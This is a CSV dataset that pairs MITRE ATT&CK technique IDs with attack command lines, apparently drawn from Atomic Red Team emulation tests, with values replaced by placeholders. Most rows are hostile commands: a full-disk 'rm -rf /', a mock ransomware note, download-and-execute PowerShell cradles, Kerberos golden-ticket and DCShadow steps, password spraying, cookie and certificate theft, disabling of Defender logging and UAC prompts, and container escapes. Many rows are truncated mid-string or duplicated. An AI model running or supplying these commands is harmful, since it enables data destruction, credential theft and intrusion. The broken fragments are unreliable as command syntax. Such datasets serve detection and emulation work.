mitre_id,command
T1530,"$storage_account_objects = import-csv -path ""var_354"
T1014,sudo insmod var_586.ko
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_854""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1560,"mkdir  $pathtoatomicsfolder\t1560.001\victim-files  cd  $pathtoatomicsfolder\t1560.001\victim-files  echo  ""this  file  will  be  encrypted""  >  .\encrypted_file.txt  ""var_660""  u  archive.7z  *txt  -pblue  dir"
T1070,set-psreadlineoption -historysavestyle savenothing
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1496,yes > \dev\null
T1546,"# set the remote computer name and credentials $remotecomputer = ""#{dest}"" $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword # create a cim session $cimsession = new-cimsession -computername $remotecomputer -credential $credential # define the process you want to start $processtostart = ""#{process}"" # invoke the create method on the win32_process class to start the process $result = invoke-cimmethod -cimsession $cimsession -classname win32_process -methodname create -arguments @{commandline = $processtostart} # check the result if ($result.returnvalue -eq 0) { write-host ""process started successfully with process id: $($result.processid)"" } else { write-host ""failed to start the process. error code: $($result.returnvalue)"" } # clean up the cim session remove-cimsession -cimsession $cimsession"
T1055,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe -pid $process.id -debug
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_385"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx"""
T1202,pcalua.exe -a var_451
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}"""
T1124,net time \\var_262 w32tm \tz
T1564,"start """" var_719"
T1491,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""var_900"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force"
T1197,"set ""var_218 \eventname:desktopimgdownldr"
T1021,enable-psremoting -force
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden $filename = (get-childitem | ? {$_.name.startswith(""golden_"")} | sort-object -descending -property lastwritetime | select -first 1).name # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge cd %temp% ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile echo. echo requesting sysvol: dir \\$(#{domaincontroller})\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""kirbifile"", $filename | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1033,set  file=var_857\user_info_%random%.tmp  echo  username:  %username%  >  %file%  echo  user  domain:  %userdomain%  >>  %file%  net  users  >>  %file%  query  user  >>  %file%
T1543,"echo ""[unit]"" > #{systemd_service_path}/#{systemd_service_file} echo ""description=atomic red team systemd service"" >> #{systemd_service_path}/#{systemd_service_file} echo """" >> #{systemd_service_path}/#{systemd_service_file} echo ""[service]"" >> #{systemd_service_path}/#{systemd_service_file} echo ""type=simple"" echo ""execstart=#{execstart_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstartpre=#{execstartpre_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstartpost=#{execstartpost_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execreload=#{execreload_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstop=#{execstop_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo ""execstoppost=#{execstoppost_action}"" >> #{systemd_service_path}/#{systemd_service_file} echo """" >> #{systemd_service_path}/#{systemd_service_file} echo ""[install]"" >> #{systemd_service_path}/#{systemd_service_file} echo ""wantedby=default.target"" >> #{systemd_service_path}/#{systemd_service_file} systemctl daemon-reload systemctl enable #{systemd_service_file} systemctl start #{systemd_service_file}"
T1090,"osascript -e 'tell application ""terminal"" to do script ""tor""'"
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') otherchecks -noninteractive -consoleoutput
T1056,"trap 'echo ""$(date +""%d/%m/%y %h:%m:%s.%s"") $user $bash_command"" >> #{output_file}' debug echo ""hello world!"" cat #{output_file}"
T1609,kubectl  create  -f  var_305
T1105,powershell.exe iwr -uri #{remote_file} -outfile #{local_path}
T1115,"dir | clip echo ""t1115"" > %temp%\t1115.txt clip < %temp%\t1115.txt"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1133,"$extlist = var_504 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1090,export var_237
T1578,gcloud compute snapshots create var_738
T1049,get-nettcpconnection
T1562,"if ((${#histignore[@]})); then echo ""\$histignore = $histignore""; else export histignore='ls*:rm*:ssh*'; echo ""\$histignore = $histignore""; fi history -c ls -la $histfile ls -la ~/.bash_logout if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi unset histignore if ((${#histignore[@]})); then echo ""\$histignore = $histignore""; else export histignore='*'; echo ""\$histignore = $histignore""; fi history -c whoami groups if [ $(history |wc -l) -eq 0 ]; then echo ""history cache is empty""; fi"
T1005,cd $home curl -o var_509; fi' \;
T1040,tcpdump  -c  5  -nnni  var_845
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_207"""
T1125,reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestart  \t  reg_binary  \d  a273b6f07104d601  \f  reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestop  \t  reg_binary  \d  96ef514b7204d601  \f
T1547,"pnputil.exe /add-driver ""#{driver_inf}"""
T1135,smbstatus --shares
T1115,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  set-clipboard  -value  ""atomic  t1115  test,  grab  data  from  clipboard  via  vba""  iex  (iwr  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1""  -usebasicparsing)  invoke-maldoc  -macrofile  ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt""  -officeproduct  ""word""  -sub  ""getclipboard"""
T1486,"1..100  |  foreach-object  {  $out  =  new-object  byte[]  1073741;  (new-object  random).nextbytes($out);  [io.file]::writeallbytes(""c:\test.$_.akira"",  $out)  }  echo  ""hi  friends""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""whatever  who  you  are  and  what  your  title  is  if  you'  re  reading  this  it  means  the  internal  infrastructure  of  your  company  is  fully  or  partially  dead,  all  your  backups  -  virtual,  physical  -  everything  that  we  managed  to  reach  -  are  completely  removed.  moreover,  we  have  taken  a  great  amount  of  your  corporate  data  prior  to  encryption  well,  for  now  let's  keep  all  the  tears  and  resentment  to  ourselves  and  try  to  build  a  constructive  dialogue.  we're  fully  aware  of  what  damage  we  caused  by  locking  your  internal  sources.  at  the  moment.  you  have  to  know:  ""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""1.  dealing  with  us  you  will  save  a  lot  due  to  we  are  not  interested  in  ruining  your  financially.  we  will  study  in  depth  your  finance,  bank  income  statements,  your  savings,  investments  etc.  and  present  our  reasonable  demand  to  you.  if  you  have  an  active  cyber  insurance,  let  us  know  and  we  will  guide  you  how  to  properly  use  it.  also,  dragging  out  the  negotiation  process  will  lead  to  failing  of  a  deal""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""2.  paying  us  you  save  your  time,  money,  efforts  and  be  back  on  track  within  24  hours  approximately.  our  decryptor  works  properly  on  any  files  or  systems,  so  you  will  be  able  to  check  it  by  requesting  a  test  decryption  service  from  the  beginning  of  our  conversation.  [f  you  decide  to  recover  on  your  own,  keep  in  mind  that  you  can  permanently  lose  access  to  some  files  or  accidently  corrupt  them  —  in  this  case  we  won't  be  able  to  help.  ""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""3.  the  security  report  or  the  exclusive  first-hand  information  that  you  will  receive  upon  reaching  an  agreement  is  of  a  great  value,  since  no  full  audit  of  your  network  will  show  you  the  vulnerabilities  that  we'  ve  managed  to  detect  and  used  in  order  to  get  into.  identify  backup  solutions  and  upload  your  data.""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""4.  as  for  your  data,  if  we  fail  to  agree,  we  will  try  to  sell  personal  information\trade  secrets\databases\source  codes  —  generally  speaking,  everything  that  has  a  value  on  the  darkmarket  -  to  multiple  threat  actors  at  ones.""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""then  all  of  this  will  be  published  in  our  blog  -""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""https:\\akira.onion""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""5.  we're  more  than  negotiable  and  will  definitely  find  the  way  to  settle  this  quickly  and  reach  an  agreement  which  will  satisfy  both  of  us""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""if  you'  re  indeed  interested  in  our  assistance  and  the  services  we  provide  you  can  reach  out  to  us  following  simple  instructions:""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""1.  install  tor  browser  to  get  access  to  our  chat  room  -  https:\\www.torproject.org\download\.""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""2.  paste  this  link  -  https:\\akira.onion""  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""3.  use  this  code  -  -  to  log  into  our  chat.""  >>  $env:userprofile\desktop\akira_readme.txt  echo  """"  >>  $env:userprofile\desktop\akira_readme.txt  echo  ""keep  in  mind  that  the  faster  you  will  get  in  touch,  the  less  damage  we  cause""  >>  $env:userprofile\desktop\akira_readme.txt"
T1531,"connect-azuread $userprincipalname = ""var_513"" remove-azureaduser -objectid $userprincipalname"
T1132,echo -n 111-11-1111 | base64 curl -xpost var_373
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_884"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1057,ps >> var_455
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1127,"copy ""var_870 %temp%\hello.js"
T1580,"export aws_region=var_864 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1543,"echo ""[unit]"" > var_102"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1611,"echo ""current user: var_166"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1098,"$x = get-random -minimum 2 -maximum 99 $y = get-random -minimum 2 -maximum 99 $z = get-random -minimum 2 -maximum 99 $w = get-random -minimum 2 -maximum 99 import-module activedirectory $account = ""var_622"" $account"
T1036,cp \bin\sh \tmp\crond; echo 'sleep 5' | \tmp\crond
T1133,"$extlist = var_399 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1070,"[ ""$(uname)"" = 'linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -r 0 / && rm -rf / > /dev/null 2> /dev/null"
T1496,yes  >  \dev\null
T1574,"copy %windir%\system32\amsi.dll %appdata%\amsi.dll ren %appdata%\amsi.dll winappxrt.dll copy %appdata%\winappxrt.dll %windir%\system32\winappxrt.dll reg add ""hkey_current_user\environment"" \v appx_process \t reg_expand_sz \d ""1"" \f"
T1113,"reg add ""hkey_current_user\software\policies\microsoft\windows\windowsai"" \v disableaidataanalysis \t reg_dword \d 0 \f reg delete ""hkey_current_user\software\policies\microsoft\windows\windowsai"" \v disableaidataanalysis \f"
T1548,$orgvalue =(get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name consentpromptbehavioradmin).consentpromptbehavioradmin set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name consentpromptbehavioradmin -value 0 -type dword -force
T1484,"import-module  azuread  import-module  aadinternals  $pword  =  convertto-securestring  -string  ""var_591  write-host  ""end  of  federation  configuration."""
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1529,"echo """" | ""var_509'`; do vim-cmd vmsvc\power.off $i & done"""
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_868"
T1195,"kubectl run var_870 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_683"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1082,"powershell.exe -c ""get-culture | format-list | out-file -filepath %tmp%\a.txt"""
T1074,"invoke-webrequest ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat"" -outfile var_785"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_795"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1218,"rundll32.exe ieadvpack.dll,launchinfsection ""#{inf_to_execute}"",defaultinstall_singleuser,1,"
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1564,"new-localuser -name ""administrator "" -nopassword"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_337"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1046,docker build -t t1046 $pathtoatomicsfolder\t1046\src\ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container \scan.sh
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1136,useradd -g 0 -m -d \root -s \bin\bash var_429; fi;
T1039,"copy-item -path ""\\var_500"""
T1204,"echo var url = ""var_447"
T1497,"if  [  ""$(sysctl  -n  hw.hv_vendor)""  !=  """"  ];  then  echo  ""virtualization  environment  detected"";  fi"
T1124,time
T1072,"""%programfiles(x86)%\var_193"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_533"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1110,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1553,regsvr32.exe  var_272
T1543,sc config var_235
T1195,"kubectl run var_986 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1040,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1047,"wmic qfe get description,installedon \format:csv"
T1072,"""%programfiles(x86)%\var_940"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_367"" net start sesshijack"
T1120,get-printer
T1033,"cmd.exe \c whoami wmic useraccount get \all quser \server:""var_992 ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > computers.txt @for \f %n in (computers.txt) do @for \f ""tokens=1,2"" %i in ('qwinsta \server:%n ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > usernames.txt"
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_873"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1040,sudo  var_493  -t  3
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1187,rpcping -s var_873 \a connect \u ntlm 1>$null
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1055,$pathtoatomicsfolder\t1055\bin\x64\etwpcreateetwthread.exe -debug
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_397\extension\"" -passthru"
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_578""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""var_103"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_100\extension\"" -passthru"
T1012,reg.exe query hklm\system\currentcontrolset\control \v systemstartoptions
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_126\extension\"" -passthru"
T1053,kubectl create -f src/cronjob.yaml -n #{namespace}
T1105,sftp.exe  var_103
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_498"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1110,"echo password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo password!>> passwords.txt echo spring2022>> passwords.txt echo changeme!>> passwords.txt @for \f ""delims="" %p in (passwords.txt) do @net use %logonserver%\ipc$ \user:""%userdomain%\var_980:%p && @net use \delete %logonserver%\ipc$ > nul"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1014,"sudo modprobe var_564 hidden"""
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_360"" -verbose"
T1030,cd var_597
T1562,"new-itemproperty ""hklm:\software\microsoft\windows\currentversion\winevt\channels\microsoft-windows-windows defender/operational"" -name enabled -propertytype dword -value 0 -force"
T1552,kubectl get secrets --all-namespaces
T1059,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -encodedcommandparamvariation #{encoded_command_param_variation} -useencodedarguments -encodedargumentsparamvariation #{encoded_arguments_param_variation} -execute -erroraction stop
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1217,"$username = (whoami).split('\')[1] $url_regex = '(htt(p|s)):\\([\w-]+\.)+[\w-]+(\[\w- .\?%&=]*)*?' $history = get-content -path ""$env:systemdrive\users\$username\appdata\local\google\chrome\user data\default\history"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""$env:userprofile\downloads\chromebrowsinghistory.txt"""
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1187,"& ""var_798 write-host ""end of petitpotam attack"""
